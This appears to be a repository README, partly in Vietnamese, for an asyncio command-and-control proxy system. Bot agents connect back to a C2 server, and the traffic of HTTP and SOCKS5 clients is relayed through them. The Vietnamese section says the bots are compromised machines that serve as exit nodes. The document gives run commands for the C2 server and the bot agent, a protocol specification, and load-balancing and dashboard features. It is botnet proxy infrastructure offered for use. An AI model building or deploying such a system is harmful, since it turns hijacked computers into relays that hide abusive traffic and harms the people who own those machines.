# Async Reverse Proxy / Relay C2 System

This repository contains an asyncio-based C2 reverse proxy/relay system with framed protocol, TLS support, heartbeats, authentication, and multiplexing.

## Components
- `protocol.py`: Framed protocol (length-prefixed JSON), heartbeat helper
- `c2_server.py`: C2 server accepting reverse Bot tunnels and local proxy clients (HTTP 8080, SOCKS5 1080)
- `bot_agent.py`: Bot agent connecting back to C2 and relaying upstream traffic

## Features
- Asyncio concurrency throughout
- TLS (optional): provide `--certfile` and `--keyfile` to C2
- Persistent reverse connections from Bots
- Multiplexing: multiple simultaneous requests per Bot using `request_id`
- Heartbeat (PING/PONG) for liveness
- Basic auth for Bots via token
- Logging for all events

## Protocol
Frames are JSON with a 4-byte big-endian length prefix.

```
{
  "type": "AUTH|OK|ERR|PING|PONG|PROXY_REQUEST|DATA|PROXY_RESPONSE|END",
  "request_id": "uuid-string",
  "payload": "base64-bytes",
  "meta": { "host": "example.com", "port": 443, "token": "..." }
}
```

## Running

### 1) C2 Server
```
python3 c2_server.py --host 0.0.0.0 --bot-port 4443 --http-port 8080 --socks-port 1080 --bot-token your_token [--certfile cert.pem --keyfile key.pem]
```

### 2) Bot Agent
```
python3 bot_agent.py --c2-host <C2_IP> --c2-port 4443 --token your_token --bot-id bot_1
```

### Test
- HTTP proxy: `curl -x http://<C2_IP>:8080 http://httpbin.org/ip`
- HTTPS proxy (CONNECT): `curl -x http://<C2_IP>:8080 https://httpbin.org/ip`
- SOCKS5: `curl --socks5-hostname <C2_IP>:1080 https://httpbin.org/ip`

## Notes
- For production, enable TLS on the bot reverse port and manage certificates.
- Add persistence/registration storage as needed.
- Extend load balancing strategies in `C2Server._next_bot`.

# 🚀 C2 Proxy Chain System

Hệ thống C2 Proxy Chain cho phép tạo mạng proxy phân tán sử dụng các bot đã bị compromise làm exit nodes.

## 📋 Kiến Trúc

```
PC Client (Browser/App) 
    ↓ (HTTP/SOCKS5 Proxy)
C2 Server (Proxy Entry Point)
    ↓ (Load Balancing)
Bot1, Bot2, Bot3... (Child Servers)
    ↓ (Direct Internet Access)
Internet
```

## 🚀 Sử Dụng Nhanh

### 1. Chạy Toàn Bộ Hệ Thống:
```bash
cd scripts
python3 run_proxy_chain.py --num-bots 3
```

### 2. Cấu Hình Client:
```bash
# HTTP Proxy
export http_proxy=http://C2_IP:8080
export https_proxy=http://C2_IP:8080

# Test
curl http://httpbin.org/ip
```

### 3. Web Dashboard:
Truy cập: `http://C2_IP:5001`

## 📁 Cấu Trúc File

```
scripts/
├── c2_proxy_server.py          # C2 Proxy Server chính
├── child_bot_server.py         # Bot server (exit node)
├── proxy_load_balancer.py      # Load Balancer & Health Monitor
├── proxy_web_dashboard.py      # Web Dashboard
├── run_proxy_chain.py          # Script chạy toàn bộ hệ thống
├── test_proxy_chain.py         # Test script
├── README_PROXY_CHAIN.md       # Hướng dẫn chi tiết
└── templates/
    └── proxy_dashboard.html    # Dashboard template
```

## 🔧 Ports

- **3333**: C2 server (bot connections)
- **8080**: HTTP proxy
- **1080**: SOCKS5 proxy  
- **5001**: Web dashboard

## 📖 Hướng Dẫn Chi Tiết

Xem file `scripts/README_PROXY_CHAIN.md` để biết thêm chi tiết về:
- Cài đặt và cấu hình
- Load balancing strategies
- Health monitoring
- Troubleshooting
- API reference

## 🎯 Tính Năng

- ✅ HTTP/SOCKS5 Proxy Support
- ✅ Load Balancing (8 algorithms)
- ✅ Health Monitoring
- ✅ Real-time Dashboard
- ✅ Auto-scaling
- ✅ Comprehensive Testing

## 🚀 Bắt Đầu

```bash
# 1. Chạy hệ thống
python3 scripts/run_proxy_chain.py

# 2. Cấu hình proxy
export http_proxy=http://localhost:8080

# 3. Test
curl http://httpbin.org/ip
```

